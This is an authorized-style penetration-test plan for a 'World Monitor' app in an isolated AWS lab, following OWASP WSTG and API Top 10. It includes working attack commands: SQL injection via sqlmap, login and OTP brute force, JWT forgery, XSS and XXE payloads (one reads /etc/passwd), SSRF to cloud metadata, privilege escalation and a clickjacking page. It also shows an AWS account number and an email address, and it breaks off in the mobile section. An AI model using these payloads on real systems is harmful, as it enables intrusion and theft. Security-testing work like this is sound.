# World Monitor — Security Assessment Plan
**Organization:** National Technical Research Organisation (NTRO)
**Category:** Software | Theme: Smart Automation
**Date:** 2026-09-20
**Environment:** AWS Student Account — eu-north-1 (Stockholm) | Account: vivek_aws (8267-8719-4506)
**Credits:** $100.00 USD remaining, expires 2027-03-20
**Methodology:** OWASP WSTG 4.2 + OWASP MASVS 2.0 + PTES

---

## Table of Contents
0. [Pre-Engagement Checklist](#0-pre-engagement-checklist)
1. [Executive Summary](#1-executive-summary)
2. [Scope, Constraints & OWASP Mapping](#2-scope-constraints--owasp-mapping)
3. [AWS Environment Setup](#3-aws-environment-setup)
4. [Phase 1 — Reconnaissance & Information Gathering](#4-phase-1--reconnaissance--information-gathering)
5. [Phase 2 — Authentication & Session Management](#5-phase-2--authentication--session-management)
6. [Phase 3 — Authorization & Access Control](#6-phase-3--authorization--access-control)
7. [Phase 4 — Input Validation, API & Injection Testing](#7-phase-4--input-validation-api--injection-testing)
8. [Phase 5 — Client-Side Security Testing](#8-phase-5--client-side-security-testing)
9. [Phase 5b — Mobile Security Testing (OWASP MASVS)](#9-phase-5b--mobile-security-testing)
10. [Phase 6 — Secure Communication & Data Storage](#10-phase-6--secure-communication--data-storage)
11. [Phase 7 — Reporting & Deliverable Template](#11-phase-7--reporting--deliverable-template)
12. [Risk Likelihood × Impact Matrix](#12-risk-likelihood--impact-matrix)
13. [AWS Cost Budget](#13-aws-cost-budget)
14. [Timeline](#14-timeline)
15. [Tools Reference](#15-tools-reference)
16. [Post-Engagement Cleanup](#16-post-engagement-cleanup)
17. [Smart Automation Integration](#17-smart-automation-integration)

---

## 0. Pre-Engagement Checklist

Complete all items before any testing begins.

### 0.1 Authorization & Legal
- [ ] Written authorization letter signed by NTRO / asset owner received
- [ ] Scope document signed (identifies in-scope IPs, URLs, and exclusions)
- [ ] Rules of Engagement (RoE) document agreed:
  - Testing hours: 09:00–18:00 IST (no overnight automated scans without approval)
  - No DoS/DDoS against any system
  - Escalation path if critical vulnerability found mid-test
- [ ] Emergency stop contact confirmed (NTRO SPOC name + phone number)
- [ ] Legal disclaimer signed: testing confined to isolated AWS environment only

### 0.2 Environment Readiness
- [ ] AWS VPC isolated (no IGW routes to production)
- [ ] World Monitor test instance deployed with **synthetic, non-production data only**
- [ ] Test user accounts created (admin, standard user, read-only user) — documented separately
- [ ] Baseline snapshot of target EC2 taken before testing starts
- [ ] AWS Budget alert set at $50 (half of $100 credit)
- [ ] CloudTrail and VPC Flow Logs enabled (audit trail)
- [ ] S3 evidence bucket created, encrypted, versioned, public-access blocked

### 0.3 Rules of Engagement Template

```
AUTHORIZED SECURITY ASSESSMENT — RULES OF ENGAGEMENT

Target System:    World Monitor Application (test environment only)
Assessor:         [Your Name / Team Name]
Organization:     NTRO
Assessment Period: [Start Date] to [End Date]
In-Scope IPs:     10.10.2.x (target EC2, VPC-internal only)
Out-of-Scope:     ALL production systems, external IPs, third-party services

Authorized actions:
  - Vulnerability scanning (active and passive)
  - Exploitation for PoC only — no data exfiltration
  - Credential brute force against test accounts only
  - Social engineering: NOT authorized

Signed: ___________________ Date: ___________
```

---

## 1. Executive Summary

This document defines a structured, authorized penetration test of the **World Monitor** web/mobile platform. All testing is performed in an isolated AWS VPC (eu-north-1) against a cloned test environment — no production users or data are affected.

**Assessment type:** Authorized black-box / grey-box penetration test
**Standard:** OWASP WSTG v4.2 + OWASP API Security Top 10 2023 + OWASP MASVS 2.0
**Duration:** 10–14 days
**AWS region:** eu-north-1 / Stockholm (student account, ~$34 estimated cost)

### Success Criteria
- At least one valid vulnerability identified and documented
- Evidence supports the existence of each vulnerability
- Risk and impact clearly explained per finding
- Practical remediation strategies provided for each finding

---

## 2. Scope, Constraints & OWASP Mapping

### 2.1 In Scope

| Area | Focus |
|---|---|
| Authentication & Sessions | Login, token handling, MFA, session lifecycle |
| Authorization & RBAC | IDOR, privilege escalation, BOLA |
| Input Validation | SQLi, XSS, XXE, SSTI, command injection |
| API Security (REST + GraphQL) | Endpoints, rate limiting, mass assignment, introspection |
| Client-Side Controls | JS source, CORS, CSP, localStorage secrets |
| Mobile Security | Android APK — storage, network, auth, reverse engineering |
| Secure Communications | TLS versions, cipher suites, HSTS, cert validation |
| Data Storage & Privacy | PII exposure, insecure storage, logging of secrets |

### 2.2 OWASP Top 10 2021 Mapping

| OWASP 2021 Category | Code | Phases That Cover It |
|---|---|---|
| Broken Access Control | A01 | Phase 3 — Authorization & RBAC |
| Cryptographic Failures | A02 | Phase 6 — TLS/Data Storage |
| Injection | A03 | Phase 4 — SQLi, XSS, XXE, SSTI, Cmd |
| Insecure Design | A04 | Phase 1 Recon, Phase 2 Auth design flaws |
| Security Misconfiguration | A05 | Phase 1 Recon, Phase 5 Client-side headers |
| Vulnerable & Outdated Components | A06 | Phase 1 (retire.js), Phase 4 (nuclei CVEs) |
| Identification & Auth Failures | A07 | Phase 2 — Auth & Session |
| Software & Data Integrity Failures | A08 | Phase 5 (SRI), Phase 4 (XXE, deserialization) |
| Security Logging & Monitoring Failures | A09 | Phase 6 (DATA-03 log review) |
| Server-Side Request Forgery | A10 | Phase 4 (INJ-09 SSRF) |

### 2.3 OWASP API Security Top 10 — 2023

| API Risk | Code | Tested In |
|---|---|---|
| Broken Object Level Authorization | API1 | Phase 3 — AUTHZ-01, AUTHZ-04 (BOLA) |
| Broken Authentication | API2 | Phase 2 — AUTH-01 through AUTH-15 |
| Broken Object Property Level Auth | API3 | Phase 3 — AUTHZ-05 (mass assignment) |
| Unrestricted Resource Consumption | API4 | Phase 4 — rate limiting check |
| Broken Function Level Authorization | API5 | Phase 3 — AUTHZ-06 (admin endpoint access) |
| Unrestricted Access to Sensitive Flows | API6 | Phase 4 — GraphQL batching attack |
| Server Side Request Forgery | API7 | Phase 4 — INJ-09 |
| Security Misconfiguration | API8 | Phase 5 & 6 — headers, CORS, TLS |
| Improper Inventory Management | API9 | Phase 1 — endpoint enumeration |
| Unsafe Consumption of APIs | API10 | Phase 4 — 3rd-party integration testing |

### 2.4 Constraints
- Testing only on the isolated AWS test environment (eu-north-1 VPC)
- No actions affecting production users or data
- Exploitation limited to PoC validation only
- Compliance with applicable laws, NTRO policies, and ethical hacking guidelines

---

## 3. AWS Environment Setup

### 3.1 Architecture

```
+------------------VPC 10.10.0.0/16 (eu-north-1, No IGW after setup)----------+
|                                                                                |
|  [Private Subnet A: 10.10.1.0/24]       [Private Subnet B: 10.10.2.0/24]   |
|                                                                                |
|  +----------------------+              +-----------------------------+        |
|  | Attacker EC2          |  ---------> | Target EC2                  |        |
|  | Kali Linux 2024       |             | World Monitor App           |        |
|  | t3.medium (Spot)      |             | t3.small                    |        |
|  | Burp/ZAP/sqlmap/      |             | Port 80/443/8080            |        |
|  | nuclei/testssl etc.   |             +-----------------------------+        |
|  +----------------------+                          |                          |
|                                                     v                          |
|                                    +-----------------------------+             |
|                                    | RDS db.t3.micro             |             |
|                                    | Test DB (synthetic data)    |             |
|                                    +-----------------------------+             |
|                                                                                |
|  [S3: worldmonitor-pentest-evidence — SSE-KMS, versioned, no public access]  |
|  [CloudTrail + VPC Flow Logs enabled for full audit trail]                   |
+--------------------------------------------------------------------------------+
```

### 3.2 AWS Resource Plan (eu-north-1 pricing)

| Resource | Type | Est. Monthly Cost | Notes |
|---|---|---|---|
| Attacker EC2 | t3.medium Spot | ~$9 | Kali Linux 2024 AMI |
| Target EC2 | t3.small | ~$15 | World Monitor app |
| RDS (test DB) | db.t3.micro | ~$15 | No Multi-AZ, no backups |
| S3 (evidence) | ~10 GB Standard | ~$0.25 | SSE-KMS encrypted |
| VPC NAT Gateway | (disabled after setup) | ~$5 | Only during install |
| KMS CMK | 1 key | ~$1 | For S3 encryption |
| CloudTrail | Standard | ~$0 | Free for management events |
| **TOTAL** | | **~$45** | Well within $100 student credit |

### 3.3 Step-by-Step AWS Setup

```bash
REGION="eu-north-1"
ACCOUNT_ID="826787194506"

# Step 1: Create VPC and subnets
VPC_ID=$(aws ec2 create-vpc --cidr-block 10.10.0.0/16 --region $REGION \
  --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=pentest-vpc}]' \
  --query 'Vpc.VpcId' --output text)

SUBNET_A=$(aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block 10.10.1.0/24 \
  --availability-zone eu-north-1a --region $REGION --query 'Subnet.SubnetId' --output text)

SUBNET_B=$(aws ec2 create-subnet --vpc-id $VPC_ID --cidr-block 10.10.2.0/24 \
  --availability-zone eu-north-1a --region $REGION --query 'Subnet.SubnetId' --output text)

# Step 2: Create Security Groups
SG_ATTACKER=$(aws ec2 create-security-group --group-name attacker-sg \
  --description "Kali attacker node" --vpc-id $VPC_ID --region $REGION \
  --query 'GroupId' --output text)

SG_TARGET=$(aws ec2 create-security-group --group-name target-sg \
  --description "World Monitor target" --vpc-id $VPC_ID --region $REGION \
  --query 'GroupId' --output text)

# Attacker: SSH from your IP only
aws ec2 authorize-security-group-ingress --group-id $SG_ATTACKER --region $REGION \
  --protocol tcp --port 22 --cidr <YOUR_IP>/32

# Target: app ports from attacker SG only
aws ec2 authorize-security-group-ingress --group-id $SG_TARGET --region $REGION \
  --protocol tcp --port 80 --source-group $SG_ATTACKER
aws ec2 authorize-security-group-ingress --group-id $SG_TARGET --region $REGION \
  --protocol tcp --port 443 --source-group $SG_ATTACKER
aws ec2 authorize-security-group-ingress --group-id $SG_TARGET --region $REGION \
  --protocol tcp --port 8080 --source-group $SG_ATTACKER

# Step 3: Launch Attacker EC2 (Kali Linux - Spot)
aws ec2 run-instances --region $REGION \
  --image-id ami-<kali-eu-north-1-ami-id> \
  --instance-type t3.medium \
  --instance-market-options '{"MarketType":"spot","SpotOptions":{"SpotInstanceType":"one-time"}}' \
  --subnet-id $SUBNET_A \
  --security-group-ids $SG_ATTACKER \
  --block-device-mappings '[{"DeviceName":"/dev/xvda","Ebs":{"VolumeSize":30,"VolumeType":"gp3"}}]' \
  --key-name pentest-key \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=kali-attacker}]'

# Step 4: Launch Target EC2
aws ec2 run-instances --region $REGION \
  --image-id ami-<world-monitor-ami> \
  --instance-type t3.small \
  --subnet-id $SUBNET_B \
  --security-group-ids $SG_TARGET \
  --key-name pentest-key \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=worldmonitor-target}]'

# Step 5: Launch RDS (test DB, synthetic data only)
aws rds create-db-instance --region $REGION \
  --db-instance-identifier worldmonitor-test \
  --db-instance-class db.t3.micro \
  --engine mysql \
  --master-username admin \
  --master-user-password <test-password-only> \
  --no-multi-az \
  --no-publicly-accessible \
  --db-subnet-group-name <your-subnet-group>

# Step 6: Create encrypted S3 bucket
# NOTE: eu-north-1 requires LocationConstraint (us-east-1 does not)
aws s3api create-bucket --bucket worldmonitor-pentest-evidence --region $REGION \
  --create-bucket-configuration LocationConstraint=eu-north-1

aws s3api put-bucket-encryption --bucket worldmonitor-pentest-evidence \
  --server-side-encryption-configuration \
  '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"aws:kms"}}]}'

aws s3api put-public-access-block --bucket worldmonitor-pentest-evidence \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

aws s3api put-bucket-versioning --bucket worldmonitor-pentest-evidence \
  --versioning-configuration Status=Enabled

# Step 7: Enable CloudTrail
aws cloudtrail create-trail --region $REGION \
  --name pentest-audit --s3-bucket-name worldmonitor-pentest-evidence
aws cloudtrail start-logging --region $REGION --name pentest-audit

# Step 8: Enable VPC Flow Logs
aws ec2 create-flow-logs --region $REGION \
  --resource-type VPC --resource-ids $VPC_ID \
  --traffic-type ALL \
  --log-destination-type s3 \
  --log-destination arn:aws:s3:::worldmonitor-pentest-evidence/vpc-flow-logs/

# Step 9: Set AWS Budget Alert at $50
aws budgets create-budget --account-id $ACCOUNT_ID \
  --budget '{"BudgetName":"pentest-budget","BudgetLimit":{"Amount":"50","Unit":"USD"},"BudgetType":"COST","TimeUnit":"MONTHLY"}' \
  --notifications-with-subscribers \
  '[{"Notification":{"NotificationType":"ACTUAL","ComparisonOperator":"GREATER_THAN","Threshold":80},
     "Subscribers":[{"SubscriptionType":"EMAIL","Address":"7stardevelopers7777@gmail.com"}]}]'

# Step 10: Disable NAT Gateway after tool installation
aws ec2 delete-nat-gateway --region $REGION --nat-gateway-id <nat-gw-id>
```

### 3.4 Tool Installation on Kali

```bash
# Update and install core tools
sudo apt update && sudo apt upgrade -y
sudo apt install -y nmap nikto sqlmap wfuzz gobuster ffuf python3-pip \
  apktool adb jadx git curl wget snap

# Burp Suite Community
wget -O burp.sh "https://portswigger.net/burp/releases/download?product=community&type=Linux"
chmod +x burp.sh && ./burp.sh

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool ~/tools/jwt_tool
pip3 install -r ~/tools/jwt_tool/requirements.txt

# nuclei + update templates
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# testssl.sh
git clone https://github.com/drwetter/testssl.sh ~/tools/testssl.sh

# OWASP ZAP
sudo snap install zaproxy --classic

# retire.js
sudo npm install -g retire

# sslyze
pip3 install sslyze

# gau (URL extractor)
go install github.com/lc/gau/v2/cmd/gau@latest

# Frida (mobile dynamic analysis)
pip3 install frida-tools objection

# MobSF (Mobile Security Framework — Docker)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# tplmap (SSTI detection)
git clone https://github.com/epinna/tplmap ~/tools/tplmap
pip3 install -r ~/tools/tplmap/requirements.txt

# Confirm install, upload receipt to S3
aws s3 cp /etc/os-release \
  s3://worldmonitor-pentest-evidence/setup/kali-os-release.txt --region eu-north-1
```

### 3.5 Nuclei — Targeted Template Categories

```bash
TARGET="https://10.10.2.x"

# Run all categories in one sweep, save JSON output
nuclei -u $TARGET \
  -t cves/ \
  -t misconfigurations/ \
  -t exposures/ \
  -t default-logins/ \
  -t vulnerabilities/ \
  -t takeovers/ \
  -severity critical,high,medium \
  -json -o nuclei/nuclei_full.json \
  -rate-limit 50 \
  -timeout 10

# Parse results
cat nuclei/nuclei_full.json | jq '.info.severity + " | " + .info.name + " | " + .matched-at' | sort

# Custom nuclei template example for World Monitor-specific IDOR check
cat > nuclei/templates/worldmonitor-idor.yaml << 'EOF'
id: worldmonitor-idor

info:
  name: World Monitor IDOR — User Profile Endpoint
  author: pentest-team
  severity: high
  tags: idor,auth,worldmonitor

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/users/{{uid}}/profile"
    payloads:
      uid:
        - "1"
        - "2"
        - "100"
        - "999"
    headers:
      Authorization: "Bearer {{token}}"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["email", "phone", "name"]
        condition: and
EOF

nuclei -u $TARGET -t nuclei/templates/worldmonitor-idor.yaml -json -o nuclei/idor_results.json
```

---

## 4. Phase 1 — Reconnaissance & Information Gathering

### 4.1 Recon Flow

```
Passive Recon → Stack Fingerprint → Active Port Scan → Endpoint Enum → JS Analysis → Attack Surface Map
```

### 4.2 Passive Reconnaissance

| Technique | Command | What to Find |
|---|---|---|
| HTTP header analysis | `curl -sI https://10.10.2.x` | Server, X-Powered-By, framework version |
| Technology fingerprint | Wappalyzer + browser | Frameworks, CMS, JS libs, CDN |
| robots.txt / sitemap | `curl https://10.10.2.x/robots.txt` | Hidden paths, disallowed endpoints |
| Source code comments | Browser DevTools → Sources | Hardcoded keys, TODO comments |
| Certificate info | `echo \| openssl s_client -connect 10.10.2.x:443` | Cert chain, SAN entries, expiry |

### 4.3 Active Reconnaissance

```bash
mkdir -p recon tls nuclei evidence/{recon,auth,authz,injection,client,tls,api,mobile}

# Full port scan
nmap -sV -sC -p- -T4 --open 10.10.2.x -oA recon/nmap_full

# Targeted service version detection
nmap -sV --version-intensity 9 -p 80,443,8080,8443,3000,4000 10.10.2.x -oA recon/nmap_services

# TLS audit
~/tools/testssl.sh/testssl.sh --full https://10.10.2.x | tee tls/testssl_full.txt

# Web server misconfiguration
nikto -h https://10.10.2.x -o recon/nikto.html -Format htm
```

### 4.4 Directory & Endpoint Enumeration

```bash
# Directory brute-force
ffuf -u https://10.10.2.x/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,201,301,302,403 -o recon/dirs.json -of json

# API endpoint enumeration
ffuf -u https://10.10.2.x/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,400,401,403 -o recon/api_endpoints.json -of json

# Recursive directory scan
gobuster dir -u https://10.10.2.x \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,js,json,html,txt,bak -t 50 -o recon/gobuster.txt

# Parameter discovery
ffuf -u 'https://10.10.2.x/api/users?FUZZ=1' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,400,500 -o recon/params.json
```

### 4.5 JavaScript Source Analysis

```bash
# Extract all JS URLs
gau https://10.10.2.x | grep '\.js$' | tee recon/js_files.txt

# Find hardcoded secrets in JS files
while read url; do
  curl -sk "$url" | grep -Ei \
    '(api[_-]?key|secret|token|password|bearer|jwt)\s*[:=]\s*["'"'"'][^"'"'"']{8,}'
done < recon/js_files.txt | tee recon/js_secrets.txt

# Extract hidden API endpoints from JS
while read url; do
  curl -sk "$url" | grep -Eo '(/api/[a-zA-Z0-9/_-]+)'
done < recon/js_files.txt | sort -u | tee recon/api_from_js.txt

# Scan for known vulnerable JS libraries
retire --path /var/www/worldmonitor/static/ --outputformat json | tee recon/retire_js.json
```

> **False Positive Check:** For JS secrets found, verify the key is actually valid by testing it against the API — an invalid or expired key is not a finding. For endpoints from JS analysis, confirm they respond to authenticated requests before logging as discovered endpoints.

### 4.6 Phase 1 Deliverables
- `recon/nmap_full.xml` — full port/service map
- `tls/testssl_full.txt` — TLS configuration issues
- `recon/dirs.json` + `recon/api_endpoints.json` — enumerated endpoints
- `recon/api_from_js.txt` — hidden endpoints from JS analysis
- `recon/js_secrets.txt` — hardcoded credentials/tokens (if any)
- `recon/retire_js.json` — vulnerable JS library findings

---

## 5. Phase 2 — Authentication & Session Management
**OWASP:** A07:2021 — Identification and Authentication Failures | API2:2023

### 5.1 Test Cases

| ID | Test | Tool | OWASP Ref |
|---|---|---|---|
| AUTH-01 | Username enumeration via error messages / timing | Burp Intruder, ffuf | WSTG-IDNT-04 |
| AUTH-02 | Brute force / credential stuffing (no rate limit) | Hydra, Burp | WSTG-ATHN-03 |
| AUTH-03 | Default / weak credentials | Manual, SecLists | WSTG-ATHN-02 |
| AUTH-04 | Password reset token predictability | Burp, Python | WSTG-ATHN-09 |
| AUTH-05 | Password reset — host header injection | Burp Repeater | WSTG-ATHN-09 |
| AUTH-06 | JWT — alg:none bypass | jwt_tool | WSTG-SESS-10 |
| AUTH-07 | JWT — weak secret (HS256 brute force) | hashcat, jwt_tool | WSTG-SESS-10 |
| AUTH-08 | JWT — kid injection / SQLi in kid parameter | jwt_tool | WSTG-SESS-10 |
| AUTH-09 | JWT — expiry not validated | jwt_tool | WSTG-SESS-10 |
| AUTH-10 | Session fixation | Burp, manual | WSTG-SESS-03 |
| AUTH-11 | Session not invalidated on logout | Burp Repeater | WSTG-SESS-06 |
| AUTH-12 | MFA OTP brute force (no lockout) | wfuzz | WSTG-ATHN-11 |
| AUTH-13 | MFA bypass via response manipulation | Burp Repeater | WSTG-ATHN-11 |
| AUTH-14 | OAuth redirect_uri manipulation | Burp, manual | WSTG-ATHN-05 |
| AUTH-15 | OAuth state parameter bypass (CSRF on OAuth) | Burp, manual | WSTG-ATHN-05 |

### 5.2 Key PoC Commands

```bash
# AUTH-01: Username enumeration timing attack
ffuf -u https://10.10.2.x/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"wrongpassword"}' \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -mc 200,401,403 -t 1  # Single thread to observe timing differences

# AUTH-02: Brute force login (only on test accounts)
hydra -l admin@test.local \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -s 443 10.10.2.x https-post-form \
  "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid credentials"

# AUTH-06/07: JWT testing
python3 ~/tools/jwt_tool/jwt_tool.py <JWT_TOKEN> -X a                         # alg:none
python3 ~/tools/jwt_tool/jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# AUTH-12: OTP brute force
wfuzz -c -z range,000000-999999 \
  -d '{"otp":"FUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<valid_session>" \
  https://10.10.2.x/api/verify-otp
```

### 5.3 Evidence & False Positive Validation
- Screenshots of error message differences (username enumeration)
- Burp Suite request/response pairs for each finding
- JWT decode and manipulation payloads
- Session token captured before and after logout
- **FP Check AUTH-01:** Confirm timing difference is >100ms consistently across multiple runs — single-run variation is noise
- **FP Check AUTH-06:** Confirm the forged token grants actual access, not just a 200 with empty data
- **FP Check AUTH-12:** Confirm the OTP is actually accepted, not just that the endpoint doesn't lock out

---

## 6. Phase 3 — Authorization & Access Control
**OWASP:** A01:2021 — Broken Access Control | API1, API3, API5:2023

### 6.1 Test Cases

| ID | Test | Tool | OWASP Ref |
|---|---|---|---|
| AUTHZ-01 | IDOR — change object IDs in API responses | Burp Repeater / Autorize | WSTG-ATHZ-04 |
| AUTHZ-02 | Horizontal privilege escalation | Burp Repeater | WSTG-ATHZ-01 |
| AUTHZ-03 | Vertical privilege escalation (user → admin) | Burp Repeater | WSTG-ATHZ-01 |
| AUTHZ-04 | BOLA on GraphQL queries/mutations | Burp, GraphQL playground | WSTG-ATHZ-04 |
| AUTHZ-05 | Mass assignment — send extra JSON fields | Burp Repeater | WSTG-INPV-20 |
| AUTHZ-06 | Admin-only function access as regular user | Burp, manual | WSTG-ATHZ-02 |
| AUTHZ-07 | Path traversal in file access endpoints | Burp, ffuf | WSTG-ATHZ-03 |
| AUTHZ-08 | Forced browsing to unlinked admin pages | gobuster, manual | WSTG-ATHZ-01 |

### 6.2 Key PoC Commands

```bash
# AUTHZ-01: IDOR
curl -H "Authorization: Bearer <user_a_token>" https://10.10.2.x/api/users/102/profile

# AUTHZ-03: Vertical privilege escalation
curl -H "Authorization: Bearer <user_token>" https://10.10.2.x/api/admin/users
curl -H "Authorization: Bearer <user_token>" https://10.10.2.x/api/admin/settings

# AUTHZ-05: Mass assignment
curl -X POST https://10.10.2.x/api/register \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","email":"attacker@test.local","password":"P@ss123","role":"admin"}'

# AUTHZ-07: Path traversal
ffuf -u 'https://10.10.2.x/api/files?path=FUZZ' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200
```

### 6.3 Burp Autorize Setup
1. Install Autorize extension in Burp Suite
2. Log in as low-privilege user → copy session token into Autorize
3. Browse as admin → Autorize replays every request with the low-priv token
4. Flag all "bypassed" responses (same status/body as admin)

> **FP Check:** For IDOR, confirm the response contains the OTHER user's actual data (not generic data). For AUTHZ-05 mass assignment, confirm the role change persists by calling a privileged endpoint.

---

## 7. Phase 4 — Input Validation, API & Injection Testing
**OWASP:** A03:2021 — Injection | A10:2021 — SSRF | API4, API6, API7:2023

### 7.1 Injection Test Cases

| ID | Type | Tool | CWE |
|---|---|---|---|
| INJ-01 | SQL Injection (error-based) | sqlmap, Burp | CWE-89 |
| INJ-02 | SQL Injection (blind/time-based) | sqlmap | CWE-89 |
| INJ-03 | Reflected XSS | Burp, wfuzz | CWE-79 |
| INJ-04 | Stored XSS | Manual, Burp | CWE-79 |
| INJ-05 | DOM-based XSS | Browser DevTools | CWE-79 |
| INJ-06 | XXE Injection | Burp, manual | CWE-611 |
| INJ-07 | SSTI (Server-Side Template Injection) | tplmap, manual | CWE-94 |
| INJ-08 | OS Command Injection | Burp, manual | CWE-78 |
| INJ-09 | SSRF | Burp Collaborator | CWE-918 |
| INJ-10 | File upload — unrestricted extension | Burp, manual | CWE-434 |
| INJ-11 | File upload — MIME type bypass | Burp | CWE-434 |

### 7.2 Key PoC Commands

```bash
# INJ-01/02: SQL Injection
sqlmap -u "https://10.10.2.x/api/users?id=1" \
  --headers="Authorization: Bearer <token>" \
  --level=5 --risk=3 --batch \
  -p id --dbms=mysql --output-dir=./evidence/injection/sqli/

# SQLi in POST body (JSON)
sqlmap -u "https://10.10.2.x/api/login" \
  --data='{"username":"admin","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=5 --risk=3 --batch

# INJ-03: Reflected XSS payloads
for payload in '<script>alert(1)</script>' '"><img src=x onerror=alert(1)>' '<svg/onload=alert(1)>'; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  curl -sk "https://10.10.2.x/search?q=$encoded" | grep -oi "alert(1)" && echo "VULNERABLE: $payload"
done

# INJ-06: XXE
cat > /tmp/xxe_payload.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request><data>&xxe;</data></request>
EOF
curl -X POST https://10.10.2.x/api/xml-parser \
  -H "Content-Type: application/xml" -d @/tmp/xxe_payload.xml

# INJ-07: SSTI detection
curl "https://10.10.2.x/api/template?name={{7*7}}"     # Jinja2/Twig — look for "49"
curl "https://10.10.2.x/api/template?name=\${7*7}"     # FreeMarker

# INJ-09: SSRF
curl "https://10.10.2.x/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://10.10.2.x/api/fetch?url=http://10.10.2.1/"
```

### 7.3 GraphQL-Specific Testing

```bash
# Introspection (information disclosure)
curl -X POST https://10.10.2.x/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Batching attack (rate limit bypass)
curl -X POST https://10.10.2.x/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(username:\"admin\",password:\"a\"){token}}"},
       {"query":"mutation{login(username:\"admin\",password:\"b\"){token}}"},
       {"query":"mutation{login(username:\"admin\",password:\"c\"){token}}"}]'
```

### 7.4 API Security Checks

```bash
# HTTP verb tampering
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
  echo -n "$method /api/admin/users → "
  curl -sk -o /dev/null -w "%{http_code}\n" -X $method \
    -H "Authorization: Bearer <user_token>" https://10.10.2.x/api/admin/users
done

# Rate limiting check
for i in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code}\n" \
    -X POST https://10.10.2.x/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin@test.local","password":"wrongpass"}'
done | sort | uniq -c
```

> **FP Check INJ-01/02:** Confirm sqlmap extracted actual table data, not just a timing anomaly. For blind SQLi, verify with at least 3 consistent time-delay responses. **FP Check SSRF:** Confirm the response body contains AWS metadata (e.g., `ami-id`, `instance-id`) — a connection refused is not a finding.

---

## 8. Phase 5 — Client-Side Security Testing
**OWASP:** A05:2021 — Security Misconfiguration | A08:2021 — Software & Data Integrity

### 8.1 Test Cases

| ID | Test | Tool | CWE |
|---|---|---|---|
| CS-01 | Sensitive data in localStorage / sessionStorage | Browser DevTools | CWE-312 |
| CS-02 | Cookies missing HttpOnly / Secure / SameSite flags | Burp, DevTools | CWE-1004 |
| CS-03 | CORS misconfiguration (null origin / wildcard + credentials) | Burp, curl | CWE-346 |
| CS-04 | Content Security Policy missing or bypassable | DevTools | CWE-116 |
| CS-05 | Clickjacking — missing X-Frame-Options / frame-ancestors | Burp, manual | CWE-1021 |
| CS-06 | Hardcoded API keys / secrets in JavaScript | grep, gau | CWE-312 |
| CS-07 | Subresource Integrity (SRI) missing on CDN scripts | Browser DevTools | CWE-494 |
| CS-08 | postMessage insecure origin check | Browser DevTools | CWE-346 |

### 8.2 Key Test Commands

```bash
# CS-01: Check localStorage (run in browser console)
# Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)))

# CS-03: CORS null origin
curl -H "Origin: null" -I https://10.10.2.x/api/user
# Vulnerable if: Access-Control-Allow-Origin: null

# CORS arbitrary origin
curl -H "Origin: https://evil.com" -I https://10.10.2.x/api/user
# Vulnerable if: Access-Control-Allow-Origin: https://evil.com AND
#                Access-Control-Allow-Credentials: true

# CS-04: Check all security headers
curl -sI https://10.10.2.x | grep -Ei \
  '(content-security-policy|x-frame-options|x-content-type|strict-transport|referrer-policy|permissions-policy)'

# CS-05: Clickjacking PoC HTML
cat > /tmp/clickjack_poc.html << 'EOF'
<html><body>
  <h1>You Won a Prize! Click the button!</h1>
  <iframe src="https://10.10.2.x/account/delete"
    style="opacity:0.01;position:absolute;top:50px;left:50px;width:500px;height:500px;"></iframe>
  <button style="position:absolute;top:80px;left:80px;">CLAIM PRIZE</button>
</body></html>
EOF
```

> **FP Check CS-03:** Confirm CORS is exploitable — both `Access-Control-Allow-Origin` reflects the attacker origin AND `Access-Control-Allow-Credentials: true` is present. Just one is not exploitable. **FP Check CS-04:** Verify CSP is completely absent OR confirm a specific bypass exists (e.g., `unsafe-inline` is set).

---

## 9. Phase 5b — Mobile Security Testing
**OWASP:** MASVS 2.0 | OWASP Mobile Top 10 2023

### 9.1 OWASP MASVS Coverage

| MASVS Category | Code | Tests |
|---|---|---|
| Storage Security | MASVS-STORAGE | Unencrypted SharedPreferences, SQLite, files |
| Cryptography | MASVS-CRYPTO | Hardcoded keys, weak algorithms (MD5, DES) |
| Authentication | MASVS-AUTH | Token storage, biometric bypass, session |
